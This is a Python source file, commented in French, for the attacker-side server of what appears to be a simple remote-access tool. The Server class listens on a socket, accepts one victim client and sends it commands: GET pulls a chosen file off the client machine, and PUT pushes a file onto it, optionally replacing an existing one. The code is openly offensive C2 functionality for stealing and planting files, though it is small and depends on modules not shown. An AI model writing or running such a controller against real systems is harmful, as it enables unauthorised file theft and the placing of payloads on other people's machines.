import socket

from ..Connection import Connection
from ..utils import file_is_present, path_is_correct


class Server:
    """
    Classe représentant un serveur, exécuté par l'attaquant.
    Il envoie les commandes au client.
    """
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_connected = False
        self.client: Connection = None

    def start_server(self, address, port):
        """
        Met le serveur en écoute
        """
        self.server.bind((address, port))
        self._server_connected = True
        self.server.listen(1)

    def connect_client(self):
        """
        Accepte une connexion client
        """
        print("Waiting connection")
        self.client = Connection(self.server.accept()[0], True)

    def disconnect_client(self):
        """
        Déconnecte le client connecté
        """
        self.client.disconnect()

    def close_server(self):
        """
        Éteint le serveur
        """
        self.server.close()
        self._server_connected = False

    def is_client_connected(self):
        """
        Renvoie vrai si un client est connecté
        """
        return self.client.is_connected()

    def is_server_connected(self):
        """
        Renvoie vrai si le serveur accepte les connextions
        """
        return self._server_connected

    def get_file(self, file_to_get, destination_path):
        """
        Reçoit un fichier du client
        """
        if not path_is_correct(destination_path):
            raise FileNotFoundError(f"{destination_path} not found")
        try:
            self.client.send_command("GET", file_to_get)
            # Savoir si on peut continuer (le fichier existe)
            self.client.receive_msg()
            self.client.receive_file(destination_path)
        except Exception:
            raise

    def put_file(self, file_to_send, destination_path, replace):
        """
        Envoie un fichier au client
        """
        if not file_is_present(file_to_send):
            raise FileNotFoundError(f"File '{file_to_send}' doesn't exist")
        try:
            if len(replace) > 0:
                self.client.send_command("PUT", destination_path, replace)
            else:
                self.client.send_command("PUT", destination_path)
            # Savoir si on peut continuer (le chemin de destination existe)
            self.client.receive_msg()
            self.client.send_file(file_to_send)
        except Exception:
            raise
